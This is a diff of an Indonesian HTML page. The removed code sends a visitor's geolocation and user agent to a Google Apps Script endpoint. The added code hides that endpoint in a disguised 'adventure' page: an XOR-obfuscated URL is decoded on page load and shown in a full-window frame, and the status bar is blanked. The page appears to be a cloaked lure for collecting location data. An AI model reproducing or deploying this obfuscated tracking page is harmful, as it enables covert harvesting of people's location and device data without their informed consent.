@@ -1,59 +1,19 @@
-<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>Share Lokasi</title>
+<title>jelajahi</title>
+<meta name="description" content="petualangan" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="jelajahi" />
+<meta property="og:description" content="petualangan" />
+<meta property="og:image" content="" />
 </head>
-<body>
-
-<button id="getLocationBtn">Klik Untuk Kirim Lokasi</button>
-<p id="status"></p>
-
-<script>
-const SERVER_URL = "https://script.google.com/macros/s/AKfycbwyrjQ-8jDIDCVOO1bUhkn4ktjJKPX074v-_mCqcqUsfyqcHzzzgZjwEVAJYfx0OQFn/exec"; // GANTI DISINI
-
-document.getElementById("getLocationBtn").addEventListener("click", () => {
-  const status = document.getElementById("status");
-  status.textContent = "Meminta izin lokasi...";
-
-  if (!navigator.geolocation) {
-    status.textContent = "Browser tidak mendukung geolocation.";
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    const acc = pos.coords.accuracy;
-    const device = navigator.userAgent;
-
-    status.textContent = "Mengirim ke server...";
-
-    try {
-
-      const res = await fetch(SERVER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          latitude: lat,
-          longitude: lon,
-          accuracy: acc,
-          userAgent: device,
-        })
-      });
-
-      status.textContent = "Berhasil mengirim lokasi.";
-
-    } catch (err) {
-      status.textContent = "Gagal mengirim: " + err;
-    }
-
-  }, (err) => {
-    status.textContent = "Lokasi ditolak atau error.";
-  });
-});
+<script language="JavaScript">
+<!--
+window.status = ' ';
+sdf = "iuuqr$2@..rbshqu/fnnfmd/bnl.l`bsnr.r.@Jgxbcxk^7q`rswxFwxeg1OPsWjxNI{7SIgstn@r`ll^TFejcdpXOTnE{3bP{`H9d5e@1vTy1v.dydb";yt="";var length=sdf.length;for(i=0;i<length;i++){yt+=String.fromCharCode(sdf.charCodeAt(i)^1);}yt=unescape(yt);
+document.writeln("<FRAMESET BORDER=\"0\" FRAMEBORDER=\"0\" FRAMESPACING=\"0\" ROWS=\"100%,0\\*\">");
+document.writeln("<frame frameBorder=\"0\" frameSpacing=\"0\" marginHeight=\"0\" marginWidth=\"0\" scrolling=\"yes\" name=\"master\" noresize src=\""+yt+"\">");
+document.writeln("<\/FRAMESET>");
+//-->
 </script>
-
-</body>
-</html>
+<noscript><a href="http://cafebisnis.com">Bisnis Online</a></noscript></html>
